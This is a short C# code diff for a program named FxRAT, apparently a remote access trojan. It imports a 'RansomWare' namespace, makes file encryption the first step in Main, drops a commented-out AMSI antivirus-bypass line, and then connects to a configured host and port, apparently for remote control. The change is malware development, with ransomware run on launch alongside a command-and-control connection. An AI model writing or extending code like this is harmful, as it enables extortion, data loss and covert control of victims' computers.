@@ -1,5 +1,6 @@
 ﻿using FxRAT.Utils;
 using Lib;
+using RansomWare;
 
 namespace FxRAT;
 
@@ -8,9 +9,9 @@ class Program
     static void Main()
     {
 
-        Connection connection = new Connection(Settings.host, Settings.port);
+        new HandleEncryption(Encryption.ENCRYPT);
         
-        //new AMSI().bypass();
+        Connection connection = new Connection(Settings.host, Settings.port);
         
         connection.Connect();
         
